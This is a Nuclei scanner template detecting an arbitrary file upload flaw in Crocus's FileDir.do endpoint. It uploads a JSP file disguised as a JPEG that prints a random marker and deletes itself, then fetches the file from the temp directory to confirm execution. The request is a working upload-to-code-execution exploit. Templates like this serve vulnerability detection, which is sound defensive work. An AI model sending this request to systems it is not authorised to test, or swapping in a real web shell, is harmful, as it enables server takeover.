id: crocus-filedir-do-anyfile-upload
info:
  name: Crocus FileDir.do Arbitrary File Upload
  author: ProjectDiscoveryAI
  severity: critical
  tags: file-upload

variables:
  t1: "{{rand_text_alpha(7)}}"
  t2: "{{base64(t1)}}"

http:
  - id: upload-file
    method: POST
    path:
      - "{{BaseURL}}/FileDir.do?Action=Upload"
    headers:
      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
    body: |-
      ------WebKitFormBoundaryFfJZ4PlAZBixjELj
      Content-Disposition: form-data; name="file"; filename="{{t1}}.jsp"
      Content-Type: image/jpeg

      <% out.print("{{t2}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
      ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "FileName"
          - ".jsp"
    extractors:
      - type: regex
        name: file
        internal: true
        regex:
          - "\"FileName\":\"(?P<file>.*?).jsp"

  - id: verify-file
    method: GET
    path:
      - "{{BaseURL}}/Plugin/FileManage/Temp/{{file}}.jsp"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "{{t2}}"
